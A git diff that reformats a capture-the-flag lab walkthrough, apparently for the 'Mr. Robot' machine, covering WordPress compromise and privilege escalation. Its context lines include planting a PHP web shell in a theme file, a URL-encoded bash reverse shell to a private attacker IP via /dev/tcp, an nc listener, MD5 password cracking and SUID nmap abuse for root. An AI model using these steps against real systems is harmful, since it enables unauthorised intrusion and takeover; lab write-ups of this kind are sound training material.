@@ -98,13 +98,13 @@ elliot
 ER28-0652
 ```
 🧑‍💻 Phase 5: WordPress RCE
-1️⃣ Login to admin panel
+- 1️⃣ Login to admin panel
 ```
 http://192.168.194.7/wp-admin
 ```
 - This step is used to access the WordPress admin dashboard using valid credentials.
 Admin access allows modification of theme files, which can be leveraged for code execution.
-2️⃣ Inject PHP Web Shell
+- 2️⃣ Inject PHP Web Shell
 
 Path:
 > Appearance → Editor → 404.php
@@ -115,7 +115,7 @@ Path:
 - This PHP code injects a web shell into the theme’s 404.php file.
 It allows execution of system commands through a URL parameter.
 **Save file**
-3️⃣ Confirm command execution
+- 3️⃣ Confirm command execution
 ```
 http://192.168.194.7/wp-content/themes/twentyfifteen/404.php?cmd=id
 ```
@@ -125,13 +125,13 @@ The output shows the current user context (daemon), verifying shell access.
 
 > uid=1(daemon) gid=1(daemon)
 🐚 Phase 6: Reverse Shell (WORKING METHOD)
-1️⃣ Start listener
+- 1️⃣ Start listener
 ```
 nc -lvnp 4444
 ```
 - This command starts a listener on the attacker machine to receive a reverse shell connection.
 It waits for the target system to connect back.
-2️⃣ Trigger reverse shell (URL-encoded bash/paste in browser)
+- 2️⃣ Trigger reverse shell (URL-encoded bash/paste in browser)
 ```
 http://192.168.194.7/wp-content/themes/twentyfifteen/404.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/192.168.194.5/4444+0%3E%261%27
 ```
@@ -143,7 +143,7 @@ Once triggered, it provides an interactive shell over the Netcat listener.
 ```
 - This indicates a successful reverse shell on the target system.
 The attacker now has command-line access as a low-privileged user within the WordPress environment.
-3️⃣ Upgrade shell
+- 3️⃣ Upgrade shell
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
@@ -154,34 +154,34 @@ It improves usability by enabling proper command execution and shell features.
 - This command confirms the current user context.
 The output shows the shell is running as the daemon user.
  🧑‍💻 Phase 7: User Escalation (robot)
-1️⃣ Navigate to robot home
+- 1️⃣ Navigate to robot home
 ```
 cd /home/robot
 ls
 ```
 - This step enumerates files in the robot user’s home directory.
 Sensitive files related to credentials and flags are discovered here.
-📌 Files:
+- 📌 Files:
 ```
 password.raw-md5
 key-2-of-3.txt
 ```
 - The presence of an MD5 hash file suggests password cracking as the next step.
 key-2-of-3.txt indicates a user-level flag.
-2️⃣ Read hash
+- 2️⃣ Read hash
 ```
 cat password.raw-md5
 ```
 - This command displays the stored MD5 password hash for the robot user.
 The hash is later cracked to obtain the plaintext password.
-📌 Hash:
+- 📌 Hash:
 > c3fcd3d76192e4007dfb496cca67e13b
 > - This is a weak MD5 hash that can be cracked using common wordlists or analysis.
-📌 Intended password (weak MD5):
+- 📌 Intended password (weak MD5):
 > abcdefghijklmnopqrstuvwxyz
 - The password is extremely weak, making MD5 cracking trivial.
 This allows escalation from the daemon user to the robot user.
-3️⃣ Switch user
+- 3️⃣ Switch user
 ```
 su roobot
 ```
@@ -195,7 +195,7 @@ The previously cracked password is used for authentication.
 ```whoami```
 - This command confirms the current user context.
 The output shows the session is now running as robot.
- 📌 Output:
+- 📌 Output:
 ```robot```
 🏳️ Flag 2 Capture
 ```
@@ -203,22 +203,22 @@ cat key-2-of-3.txt
 ```
 - This command reads the second flag stored in the robot user’s home directory.
 Capturing this file confirms successful user-level privilege escalation.
-✅ Flag-2:
+- ✅ Flag-2:
 
 > 822xx395618xf6x4xx5edexeb3xf959
 👑 Phase 8: Root Privilege Escalation
-  1️⃣ Find SUID binaries
+- 1️⃣ Find SUID binaries
 ```
 find / -perm -4000 2>/dev/null
 ```
 - This command searches for files with the SUID permission set.
 SUID binaries can allow privilege escalation if they are misconfigured or vulnerable.
-📌 Vulnerable binary:
+- 📌 Vulnerable binary:
 ```
 /usr/bin/nmap
 ```
 - The presence of nmap with SUID permissions indicates a known privilege escalation vector.
-2️⃣ Exploit SUID nmap
+- 2️⃣ Exploit SUID nmap
 ```
 nmap --interactive
 ```
@@ -228,13 +228,13 @@ nmap --interactive
 ```
 - This command is executed inside Nmap interactive mode to spawn a system shell.
 Since nmap is running with SUID root privileges, the spawned shell inherits root access, leading to full privilege escalation.
-3️⃣ Root confirmation
+- 3️⃣ Root confirmation
 ``` whoami```
 - This command verifies the current user.
 The output confirms root-level access.
 📌 Output:
 > root
-> 🏁 Phase 9: Final Flag
+- 🏁 Phase 9: Final Flag
 ```
 cd /root
 ```
@@ -243,6 +243,6 @@ cd /root
 cat key-3-of-3.txt
 ```
 - This command reads the final flag, confirming successful root compromise.
-✅ Flag-3:
+- ✅ Flag-3:
 
 04787ddef27c3dxe1ee1x1x216x0x4e4
